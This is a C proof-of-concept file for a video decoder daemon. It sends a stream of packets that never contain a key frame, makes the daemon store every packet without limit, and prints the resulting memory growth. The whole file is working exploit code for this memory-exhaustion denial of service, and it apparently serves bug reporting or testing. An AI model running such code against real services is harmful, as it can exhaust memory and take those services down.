// PoC: a guest that never sends a key frame makes the daemon keep every packet (s->saved) forever.  Not a fuzzer: opens a
// software decoder through dsta, then sends NPKT dfrm messages of PKT bytes each and prints the daemon's own counters and
// the process's peak RSS.  Build: clang -O1 -DVIDEOD_SRC='"gen/venera-videod-sw-raw.c"' poc_saved.c (see run.sh's FLAGS).
#include "common.h"
#include <sys/resource.h>
static void sink_msg(const buf *m) {}
int main(int argc, char **argv) {
    int npkt = argc > 1 ? atoi(argv[1]) : 200, pkt = argc > 2 ? atoi(argv[2]) : (1 << 20);
    shm = fake_shm();
    out.msg = sink_msg, out.fill = sink_fill_nop;
    hwdev = (AVBufferRef *)1;
    av_log_set_level(AV_LOG_QUIET);
    FILE *f = fopen("seeds/fds/real_264", "rb");
    uint8_t fds[4096];
    size_t fn = fread(fds, 1, sizeof(fds), f);
    fclose(f);
    struct vv_surf sf = {.id = 1};
    buf m = {0};
    msg_header(&m, "+dec", 1, FIXED_UUID, 1);
    field_s32(&m, "cod", (int32_t)FOURCC('a', 'v', 'c', '1'));
    engine_msg(m.p, m.n, &sf, 1);
    msg_header(&m, "dsta", 1, FIXED_UUID, 2);
    field(&m, "fds", "fds", fds, fn);
    engine_msg(m.p, m.n, &sf, 1);
    session *s = find_session(FIXED_UUID);
    printf("decoder open: %s\n", s && s->c ? "yes" : "NO");
    uint8_t *sample = calloc(1, (size_t)pkt);
    sample[0] = (uint8_t)((pkt - 4) >> 24), sample[1] = (uint8_t)((pkt - 4) >> 16), sample[2] = (uint8_t)((pkt - 4) >> 8), sample[3] = (uint8_t)(pkt - 4);
    sample[4] = 0x41;   // a non-IDR slice NAL header: never a key frame
    buf sb = {0};
    put_be(&sb, 8 + 8 + pkt, 4), put(&sb, "sbuf", 4);
    put_be(&sb, 8 + pkt, 4), put(&sb, "sdat", 4), put(&sb, sample, (size_t)pkt);
    for (int i = 1; i <= npkt; i++) {
        msg_header(&m, "dfrm", 1, FIXED_UUID, 10 + i);
        field_s64(&m, "frm", i);
        field_u32(&m, "dfl", 0);
        field(&m, "sbf", "sbf", sb.p, sb.n);
        engine_msg(m.p, m.n, &sf, 1);
        if (i % (npkt / 5 ? npkt / 5 : 1) == 0) {
            struct rusage ru;
            getrusage(RUSAGE_SELF, &ru);
            printf("after %4d packets of %d bytes: nsaved=%d  peak RSS %ld MB\n", i, pkt, s->nsaved, ru.ru_maxrss / 1024);
        }
    }
    return 0;
}
